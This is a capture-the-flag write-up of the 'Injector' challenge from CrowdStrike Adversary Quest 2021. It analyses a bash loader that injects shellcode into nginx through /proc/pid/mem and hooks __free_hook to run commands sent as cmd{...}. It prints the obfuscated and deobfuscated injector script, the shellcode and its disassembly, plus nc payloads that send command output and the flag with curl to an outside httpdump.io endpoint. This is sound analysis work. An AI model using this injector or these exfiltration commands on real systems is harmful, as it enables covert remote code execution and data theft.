# Crowdstrike Adversary Quest 2021 / Space Jackal / Injector

## Challenge Description
The decrypted forum messages revealed that a disgruntled employee at one of our customers joined SPACE JACKAL and backdoored a host at their employer before they quit. Our customer provided us with a snapshot of that machine.
Please identify the backdoor and validate your findings against our test instance of that host, which is available at injector.challenges.adversary.zone.

## Pre-Requisites
This challenge consists of a qcow2 image, that needs qemu to run. In case qemu isn't installed, yet, now is a good time to do so. ;-)
```
sudo apt install qemu-system-x86
```

qemu-img can be used to list snapshots of this image.
```
qemu-img snapshot -l art_ctf_injector_local.qcow2 
Snapshot list:
ID        TAG               VM SIZE                DATE     VM CLOCK     ICOUNT
1         compromised       452 MiB 2021-01-13 20:15:55 00:02:17.632           
```

The run.sh script uses qemu-system-x86_64 to run the image.
```
./run.sh 
Restoring snapshot compromised (art_ctf_injector_local.qcow2)
Press Return...
```

One of the options used for qemu inside run.sh is setting up port forwarding for the custom ports tcp/3322 and tcp/4321 from host to guest system.
```
hostfwd=tcp::3322-:3322,hostfwd=tcp::4321-:4321
```

## Emurate Network Services with Listen Ports
So, which network services might listen of the forwarded custom ports?
```
root@injector-local:~# netstat -pantu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      363/systemd-resolve 
tcp        0      0 0.0.0.0:3322            0.0.0.0:*               LISTEN      377/sshd: /usr/sbin 
tcp        0      0 0.0.0.0:4321            0.0.0.0:*               LISTEN      379/nginx: master p 
tcp6       0      0 :::3322                 :::*                    LISTEN      377/sshd: /usr/sbin 
udp        0      0 127.0.0.53:53           0.0.0.0:*                           363/systemd-resolve 
udp        0      0 0.0.0.0:68              0.0.0.0:*                           591/dhclient
```
Looks like there is an sshd process with PID 377 listening on tcp port 3322 and an nginx process with PID 379 listening on tcp port 4321. These might be the processes that have been backdoored.

## Nmap Scan of Backdoored Target Server
It would be interesting to verify if both of these custom ports are open on the target server as well.
```
# Nmap 7.91 scan initiated Wed Jan 20 00:13:42 2021 as: nmap -Pn -p4321,3322,1-1024 -oA nmap injector.challenges.adversary.zone
Nmap scan report for injector.challenges.adversary.zone (167.99.209.243)
Host is up (0.073s latency).
Not shown: 1023 filtered ports
PORT     STATE SERVICE
1022/tcp open  exp2
3322/tcp open  active-net
4321/tcp open  rwhois

# Nmap done at Wed Jan 20 00:15:34 2021 -- 1 IP address (1 host up) scanned in 111.64 seconds
```

## todo: find backdoor loader in /tmp/.hax/injector.sh
might have been luck?
```
root@injector-local:~# find / -name *injector*
/tmp/.hax/injector.sh
```

```
root@injector-local:~# find {/usr,/tmp,/opt} -type f ! -mtime +30
/tmp/.hax/injector.sh
```


## todo: script is obfuscated
```bash
#!/bin/bash

set -e

roth8Kai() {
        for i in $(seq 0 7); do 
                curr=$(($1 >> $i*8 & 0xff))
                packed="$packed$(printf '\\x%02x' $curr)"
        done

        echo $packed
}

ieph2Oon() {
    echo $((0x$(nm -D "$1" | sed 's/@.*//' | grep -E " $2$" | cut -d ' ' -f1)))
}

QueSh8yi() {
    echo -ne "$3" | dd of="/proc/$1/mem" bs=1 "seek=$2" conv=notrunc 2>/dev/null
}

ojeequ9I() {
    code="$1"
    from=$(echo "$2" | sed 's/\\/\\\\/g')
    to=$(echo $3 | sed 's/\\/\\\\/g')

    echo $code | sed "s/$from/$to/g"
}

xeiCh4xi() {
    echo "$1" | base64 -d | gzip -d
}

ia5Uuboh() {
    go7uH1yu="$1"

    ih9Ea1se=$(grep -E "/libc.*so$" "/proc/$go7uH1yu/maps" | head -n 1 | tr -s ' ')
    Teixoo1Z=$((0x$(cut -d '-' -f1 <<< "$ih9Ea1se")))
    cu1eiSe9=$(cut -d ' ' -f6 <<< "$ih9Ea1se")
    eo0oMaeL=$((Teixoo1Z+$(ieph2Oon $cu1eiSe9 $(xeiCh4xi H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA==))))
    de0fie1O=$((Teixoo1Z+$(ieph2Oon $cu1eiSe9 $(xeiCh4xi H4sIAAAAAAAAAyuuLC5JzQUAixFNyQYAAAA=))))
    EeGie9qu=$((Teixoo1Z+$(ieph2Oon $cu1eiSe9 $(xeiCh4xi H4sIAAAAAAAAA0srSk0FAMjBLk0EAAAA))))
    Eeko2juZ=$((Teixoo1Z+$(ieph2Oon $cu1eiSe9 $(xeiCh4xi H4sIAAAAAAAAA8tNzMnJT44vLU5MykmNL86sSgUA3kc6ChIAAAA=))))
    Iek6Joyo=$((0x$(grep -E "/libc.*so$" "/proc/$go7uH1yu/maps" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2)))

    HeiSuC5o='\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\x41\x55\x49\xbd\x43\x43\x43\x43\x43\x43\x43\x43\x41\x54\x49\x89\xfc\x55\x53\x4c\x89\xe3\x52\xff\xd0\x48\x89\xc5\x48\xb8\x44\x44\x44\x44\x44\x44\x44\x44\x48\xc7\x00\x00\x00\x00\x00\x48\x83\xfd\x05\x76\x61\x80\x3b\x63\x75\x54\x80\x7b\x01\x6d\x75\x4e\x80\x7b\x02\x64\x75\x48\x80\x7b\x03\x7b\x75\x42\xc6\x03\x00\x48\x8d\x7b\x04\x48\x8d\x55\xfc\x48\x89\xf8\x8a\x08\x48\x89\xc3\x48\x89\xd5\x48\x8d\x40\x01\x48\x8d\x52\xff\x8d\x71\xe0\x40\x80\xfe\x5e\x77\x1b\x80\xf9\x7d\x75\x08\xc6\x03\x00\x41\xff\xd5\xeb\x0e\x48\x83\xfa\x01\x75\xd4\xbd\x01\x00\x00\x00\x48\x89\xc3\x48\xff\xc3\x48\xff\xcd\xeb\x99\x48\xb8\x42\x42\x42\x42\x42\x42\x42\x42\x4c\x89\xe7\xff\xd0\x48\xb8\x55\x55\x55\x55\x55\x55\x55\x55\x48\xa3\x44\x44\x44\x44\x44\x44\x44\x44\x58\x5b\x5d\x41\x5c\x41\x5d\xc3'
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x41\x41\x41\x41\x41\x41\x41\x41' $(roth8Kai $Eeko2juZ))
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x42\x42\x42\x42\x42\x42\x42\x42' $(roth8Kai $EeGie9qu))
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x43\x43\x43\x43\x43\x43\x43\x43' $(roth8Kai $de0fie1O))
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x44\x44\x44\x44\x44\x44\x44\x44' $(roth8Kai $eo0oMaeL))
    Que2vah0=$(echo -ne $HeiSuC5o | wc -c)
    Thee6ahB=$(($Iek6Joyo - $Que2vah0))
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x55\x55\x55\x55\x55\x55\x55\x55' $(roth8Kai $Thee6ahB))

    QueSh8yi $go7uH1yu $Thee6ahB $HeiSuC5o
    QueSh8yi $go7uH1yu $eo0oMaeL $(roth8Kai $Thee6ahB)
}

if [ $# -ne 1  ] || [ ! -e "/proc/$1" ] ; then
    exit 42
fi

ia5Uuboh $1
```

## todo: refactor/deobfuscate/comment shellscript /tmp/.hax/injector.sh
```bash
#!/bin/bash

set -e

bigEndianToLittleEndian() {
        # transform bytes (param $1) from big endian to little endian
        for i in $(seq 0 7); do 
                curr=$(($1 >> $i*8 & 0xff))
                packed="$packed$(printf '\\x%02x' $curr)"
        done

        echo $packed
}

getRVAForSymbol() {
    # nm - list symbols from object files
        # -D - dynamic
    echo $((0x$(nm -D "$1" | sed 's/@.*//' | grep -E " $2$" | cut -d ' ' -f1)))
}

patchCodeIntoPidVmemVA() {
    # write shellcode (param $3) into vmem of target pid (param $1) at offset/VA (param $2)
    echo -ne "$3" | dd of="/proc/$1/mem" bs=1 "seek=$2" conv=notrunc 2>/dev/null
}

searchAndReplace() {
    code="$1"
    from=$(echo "$2" | sed 's/\\/\\\\/g')
    to=$(echo $3 | sed 's/\\/\\\\/g')

    echo $code | sed "s/$from/$to/g"
}

debase64gunzip() {
    echo "$1" | base64 -d | gzip -d
}

main() {
    # function param $1 is shell script param $1
        # from usage (/proc/$var) its likely the pid of the
        # target process to inject into
    pid="$1"

        # return first line in /proc/$pid/maps for libc.*so
    firstLineLibcInMaps=$(grep -E "/libc.*so$" "/proc/$pid/maps" | head -n 1 | tr -s ' ')

        # parse base address of libc in target vmem, interprete it as hex (yields decimal base addr)
    libcBaseAddr=$((0x$(cut -d '-' -f1 <<< "$firstLineLibcInMaps")))

        # parse filesystem path for libc in target vmem map
    libcBaseFsPath=$(cut -d ' ' -f6 <<< "$firstLineLibcInMaps")

        # find offset of symbol __free_hook in libcFsPath (debase64gunzip of H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA==)
        # add offset to base addr for VA of __free_hook in target vmem
    VA_free_hook=$((libcBaseAddr+$(getRVAForSymbol $libcBaseFsPath $(debase64gunzip H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA==))))

        # same as above for system
    VA_system=$((libcBaseAddr+$(getRVAForSymbol $libcBaseFsPath $(debase64gunzip H4sIAAAAAAAAAyuuLC5JzQUAixFNyQYAAAA=))))

        # same as above for free
    VA_free=$((libcBaseAddr+$(getRVAForSymbol $libcBaseFsPath $(debase64gunzip H4sIAAAAAAAAA0srSk0FAMjBLk0EAAAA))))

        # same as above for malloc_usable_size
    VA_malloc_usable_size=$((libcBaseAddr+$(getRVAForSymbol $libcBaseFsPath $(debase64gunzip H4sIAAAAAAAAA8tNzMnJT44vLU5MykmNL86sSgUA3kc6ChIAAAA=))))

        # parse map file for target pid for first vmem range with r-xp permissions (read & execute) and save its region's end address
    VA_end_of_rxp_vmem=$((0x$(grep -E "/libc.*so$" "/proc/$pid/maps" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2)))

    shellcode='\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\x41\x55\x49\xbd\x43\x43\x43\x43\x43\x43\x43\x43\x41\x54\x49\x89\xfc\x55\x53\x4c\x89\xe3\x52\xff\xd0\x48\x89\xc5\x48\xb8\x44\x44\x44\x44\x44\x44\x44\x44\x48\xc7\x00\x00\x00\x00\x00\x48\x83\xfd\x05\x76\x61\x80\x3b\x63\x75\x54\x80\x7b\x01\x6d\x75\x4e\x80\x7b\x02\x64\x75\x48\x80\x7b\x03\x7b\x75\x42\xc6\x03\x00\x48\x8d\x7b\x04\x48\x8d\x55\xfc\x48\x89\xf8\x8a\x08\x48\x89\xc3\x48\x89\xd5\x48\x8d\x40\x01\x48\x8d\x52\xff\x8d\x71\xe0\x40\x80\xfe\x5e\x77\x1b\x80\xf9\x7d\x75\x08\xc6\x03\x00\x41\xff\xd5\xeb\x0e\x48\x83\xfa\x01\x75\xd4\xbd\x01\x00\x00\x00\x48\x89\xc3\x48\xff\xc3\x48\xff\xcd\xeb\x99\x48\xb8\x42\x42\x42\x42\x42\x42\x42\x42\x4c\x89\xe7\xff\xd0\x48\xb8\x55\x55\x55\x55\x55\x55\x55\x55\x48\xa3\x44\x44\x44\x44\x44\x44\x44\x44\x58\x5b\x5d\x41\x5c\x41\x5d\xc3'
    shellcode=$(searchAndReplace $shellcode '\x41\x41\x41\x41\x41\x41\x41\x41' $(bigEndianToLittleEndian $VA_malloc_usable_size))
    shellcode=$(searchAndReplace $shellcode '\x42\x42\x42\x42\x42\x42\x42\x42' $(bigEndianToLittleEndian $VA_free))
    shellcode=$(searchAndReplace $shellcode '\x43\x43\x43\x43\x43\x43\x43\x43' $(bigEndianToLittleEndian $VA_system))
    shellcode=$(searchAndReplace $shellcode '\x44\x44\x44\x44\x44\x44\x44\x44' $(bigEndianToLittleEndian $VA_free_hook))
    sizeOfShellcode=$(echo -ne $shellcode | wc -c)
    VA_to_inject_shellcode=$(($VA_end_of_rxp_vmem - $sizeOfShellcode))
    shellcode=$(searchAndReplace $shellcode '\x55\x55\x55\x55\x55\x55\x55\x55' $(bigEndianToLittleEndian $VA_to_inject_shellcode))

    patchCodeIntoPidVmemVA $pid $VA_to_inject_shellcode $shellcode
    patchCodeIntoPidVmemVA $pid $VA_free_hook $(bigEndianToLittleEndian $VA_to_inject_shellcode)
}

if [ $# -ne 1  ] || [ ! -e "/proc/$1" ] ; then
    exit 42
fi

main $1
```

## todo: analyze shellscript
does this
then that

## todo: disassemble base shellcode (without dynamic substitutions from shellscript
```
r2 -a x86 -b 64 -qc pd shellcode_unpatched.bin
            0x00000000      48b841414141.  movabs rax, 0x4141414141414141 ; 'AAAAAAAA'
            0x0000000a      4155           push r13
            0x0000000c      49bd43434343.  movabs r13, 0x4343434343434343 ; 'CCCCCCCC'
            0x00000016      4154           push r12
            0x00000018      4989fc         mov r12, rdi
            0x0000001b      55             push rbp
            0x0000001c      53             push rbx
            0x0000001d      4c89e3         mov rbx, r12
            0x00000020      52             push rdx
            0x00000021      ffd0           call rax
            0x00000023      4889c5         mov rbp, rax
            0x00000026      48b844444444.  movabs rax, 0x4444444444444444 ; 'DDDDDDDD'
            0x00000030      48c700000000.  mov qword [rax], 0
        ┌─> 0x00000037      4883fd05       cmp rbp, 5
       ┌──< 0x0000003b      7661           jbe 0x9e
       │╎   0x0000003d      803b63         cmp byte [rbx], 0x63 ; 'c'
      ┌───< 0x00000040      7554           jne 0x96
      ││╎   0x00000042      807b016d       cmp byte [rbx + 1], 0x6d ; 'm'
     ┌────< 0x00000046      754e           jne 0x96
     │││╎   0x00000048      807b0264       cmp byte [rbx + 2], 0x64 ; 'd'
    ┌─────< 0x0000004c      7548           jne 0x96
    ││││╎   0x0000004e      807b037b       cmp byte [rbx + 3], 0x7b ; '{
   ┌──────< 0x00000052      7542           jne 0x96
   │││││╎   0x00000054      c60300         mov byte [rbx], 0
   │││││╎   0x00000057      488d7b04       lea rdi, [rbx + 4]
   │││││╎   0x0000005b      488d55fc       lea rdx, [rbp - 4]
   │││││╎   0x0000005f      4889f8         mov rax, rdi
  ┌───────> 0x00000062      8a08           mov cl, byte [rax]
  ╎│││││╎   0x00000064      4889c3         mov rbx, rax
  ╎│││││╎   0x00000067      4889d5         mov rbp, rdx
  ╎│││││╎   0x0000006a      488d4001       lea rax, [rax + 1]
  ╎│││││╎   0x0000006e      488d52ff       lea rdx, [rdx - 1]
  ╎│││││╎   0x00000072      8d71e0         lea esi, [rcx - 0x20]
  ╎│││││╎   0x00000075      4080fe5e       cmp sil, 0x5e               ; 94
  ────────< 0x00000079      771b           ja 0x96
  ╎│││││╎   0x0000007b      80f97d         cmp cl, 0x7d                ; '}'
  ────────< 0x0000007e      7508           jne 0x88
  ╎│││││╎   0x00000080      c60300         mov byte [rbx], 0
  ╎│││││╎   0x00000083      41ffd5         call r13
  ────────< 0x00000086      eb0e           jmp 0x96
  ────────> 0x00000088      4883fa01       cmp rdx, 1
  └───────< 0x0000008c      75d4           jne 0x62
   │││││╎   0x0000008e      bd01000000     mov ebp, 1
   │││││╎   0x00000093      4889c3         mov rbx, rax
  ─└└└└───> 0x00000096      48ffc3         inc rbx
       │╎   0x00000099      48ffcd         dec rbp
       │└─< 0x0000009c      eb99           jmp 0x37
       └──> 0x0000009e      48b842424242.  movabs rax, 0x4242424242424242 ; 'BBBBBBBB'
            0x000000a8      4c89e7         mov rdi, r12
            0x000000ab      ffd0           call rax
            0x000000ad      48b855555555.  movabs rax, 0x5555555555555555 ; 'UUUUUUUU'
            0x000000b7      48a344444444.  movabs qword [0x4444444444444444], rax ; [0x4444444444444444:8]=-1
            0x000000c1      58             pop rax
            0x000000c2      5b             pop rbx
            0x000000c3      5d             pop rbp
            0x000000c4      415c           pop r12
            0x000000c6      415d           pop r13
            0x000000c8      c3             ret
```

## todo: analyzse shellcode
bla - substitutions

shellcode calls malloc_usable_size first, exits if <5 bytes
checks rdi (param to __free_hook), does it point to a buffer that starts with cmd{?
if so, let rbx point to the command inside {}

call system with string param pointed to by rbx (the rce command)

## todo: verify backdoor in local image
test sshd/nginx processes in qemu image for having been injected
```
nc 0 4321
cmd{echo bla > /tmp/bla}
```

```
root@injector-local:/tmp# ls -la
total 48
drwxrwxrwt 11 root     root     4096 Jan 21 22:20 .
drwxr-xr-x 19 root     root     4096 Dec 21 16:20 ..
-rw-rw-rw-  1 www-data www-data    4 Jan 21 22:20 bla
```
-> seems like nginx has been injected with the shellcode

## todo: it's a blind rce
set up a http endpoint at httpdump.io
```
nc injector.challenges.adversary.zone 4321
cmd{ls -l | curl -X POST --data-binary @- https://httpdump.io/hwie_}
```
yields
```
total 64
lrwxrwxrwx   1 root root     7 Oct 22 13:58 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Dec 17 15:16 boot
drwxr-xr-x   2 root root  4096 Dec 17 14:59 cdrom
drwxr-xr-x  17 root root  3860 Jan 21 13:40 dev
drwxr-xr-x  92 root root  4096 Jan 12 14:56 etc
lrwxrwxrwx   1 root root    19 Jan 12 12:57 flag -> /home/user/flag.txt
lrwxrwxrwx   1 root root    19 Jan 12 12:10 flag.txt -> /home/user/flag.txt
drwxr-xr-x   3 root root  4096 Dec 17 15:07 home
lrwxrwxrwx   1 root root     7 Oct 22 13:58 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Oct 22 13:58 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Oct 22 13:58 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Oct 22 13:58 libx32 -> usr/libx32
drwx------   2 root root 16384 Dec 17 14:59 lost+found
drwxr-xr-x   2 root root  4096 Oct 22 13:58 media
drwxr-xr-x   2 root root  4096 Oct 22 13:58 mnt
drwxr-xr-x   2 root root  4096 Oct 22 13:58 opt
dr-xr-xr-x 170 root root     0 Jan 21 13:39 proc
drwx------   7 root root  4096 Jan 13 18:37 root
drwxr-xr-x  24 root root   720 Jan 21 17:32 run
lrwxrwxrwx   1 root root     8 Oct 22 13:58 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Oct 22 13:58 srv
dr-xr-xr-x  13 root root     0 Jan 21 13:39 sys
drwxrwxrwt  10 root root  4096 Jan 21 22:08 tmp
drwxr-xr-x  14 root root  4096 Oct 22 13:58 usr
drwxr-xr-x  13 root root  4096 Dec 30 18:16 var
```

## todo: flag
```
nc injector.challenges.adversary.zone 4321
cmd{cat flag.txt | curl -X POST --data-binary @- https://httpdump.io/hwie_}
```
Flag: CS{fr33_h00k_b4ckd00r}

